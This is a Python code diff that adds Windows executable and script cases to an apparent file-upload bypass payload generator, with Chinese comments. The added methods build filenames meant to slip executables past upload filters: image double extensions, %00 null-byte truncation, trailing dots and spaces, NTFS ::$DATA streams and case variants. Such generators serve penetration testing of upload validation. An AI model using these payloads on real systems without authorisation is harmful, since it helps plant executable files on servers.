@@ -273,6 +273,20 @@ class BypassPayloadGenerator:
                 'severity': '高',
                 'generator': self._php_wrapper_bypass
             },
+            # 38. Windows可执行文件上传
+            'windows_executable': {
+                'name': 'Windows可执行文件上传',
+                'description': 'EXE/SCR/PIF等Windows可执行文件绕过',
+                'severity': '极高',
+                'generator': self._windows_executable
+            },
+            # 39. Windows脚本文件
+            'windows_script': {
+                'name': 'Windows脚本文件',
+                'description': 'BAT/CMD/PS1/VBS等脚本文件绕过',
+                'severity': '高',
+                'generator': self._windows_script
+            },
         }
     
     def _case_bypass(self, filename: str, ext: str) -> List[str]:
@@ -860,6 +874,109 @@ class BypassPayloadGenerator:
             f"php://filter",                    # filter协议
             f"php://input",                     # input协议
         ]
+        
+        return results
+    
+    def _windows_executable(self, filename: str, ext: str) -> List[str]:
+        """Windows可执行文件上传绕过
+        
+        针对Windows系统的可执行文件上传测试:
+        - EXE/DLL/MSI等PE文件
+        - SCR/PIF/COM等替代格式
+        - 双扩展名、空字节、大小写等绕过技术
+        """
+        results = []
+        
+        # Windows可执行文件扩展名
+        executable_exts = [
+            'exe',      # 标准可执行文件
+            'dll',      # 动态链接库
+            'msi',      # Windows安装包
+            'scr',      # 屏幕保护程序
+            'pif',      # 程序信息文件
+            'com',      # DOS命令文件
+        ]
+        
+        # 基础可执行文件
+        for exe_ext in executable_exts:
+            results.append(f"{filename}.{exe_ext}")
+        
+        # 双扩展名绕过 (伪装成图片)
+        image_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']
+        for exe_ext in executable_exts:
+            for img_ext in image_exts:
+                results.append(f"{filename}.{exe_ext}.{img_ext}")
+                results.append(f"{filename}.{img_ext}.{exe_ext}")
+        
+        # 空字节截断
+        results.append(f"{filename}.exe%00.jpg")
+        results.append(f"{filename}.exe%00.png")
+        
+        # Windows特性: 尾部点号和空格
+        results.append(f"{filename}.exe.")      # Windows自动去除尾部点
+        results.append(f"{filename}.exe ")      # Windows自动去除尾部空格
+        results.append(f"{filename}.exe...")    # 多个点
+        results.append(f"{filename}.exe   ")    # 多个空格
+        
+        # NTFS备用数据流 (ADS)
+        results.append(f"{filename}.exe::$DATA")
+        results.append(f"{filename}.exe:Zone.Identifier")
+        
+        # 大小写绕过 (Windows不区分大小写)
+        results.append(f"{filename}.EXE")
+        results.append(f"{filename}.ExE")
+        results.append(f"{filename}.eXe")
+        
+        # 特殊字符
+        results.append(f"{filename}.exe;")      # 分号
+        results.append(f"{filename}.exe:")      # 冒号
+        results.append(f"{filename}.exe::")     # 双冒号
+        
+        return results
+    
+    def _windows_script(self, filename: str, ext: str) -> List[str]:
+        """Windows脚本文件上传绕过
+        
+        Windows脚本文件通常可以直接执行:
+        - BAT/CMD: 批处理文件
+        - PS1: PowerShell脚本
+        - VBS: VBScript
+        - JS: JScript
+        - WSF: Windows脚本文件
+        - HTA: HTML应用程序
+        """
+        results = []
+        
+        # Windows脚本扩展名
+        script_exts = [
+            'bat',      # 批处理文件
+            'cmd',      # Windows命令脚本
+            'ps1',      # PowerShell脚本
+            'vbs',      # VBScript
+            'vbe',      # VBScript编码
+            'js',       # JScript
+            'jse',      # JScript编码
+            'wsf',      # Windows脚本文件
+            'wsc',      # Windows脚本组件
+            'hta',      # HTML应用程序
+        ]
+        
+        # 基础脚本文件
+        for script_ext in script_exts:
+            results.append(f"{filename}.{script_ext}")
+        
+        # 双扩展名绕过
+        image_exts = ['jpg', 'jpeg', 'png', 'gif', 'txt']
+        for script_ext in script_exts:
+            for img_ext in image_exts:
+                results.append(f"{filename}.{script_ext}.{img_ext}")
+                results.append(f"{filename}.{img_ext}.{script_ext}")
+        
+        # 特殊绕过
+        results.append(f"{filename}.bat%00.jpg")
+        results.append(f"{filename}.ps1%00.jpg")
+        results.append(f"{filename}.bat.")
+        results.append(f"{filename}.ps1.")
         
         return results
     
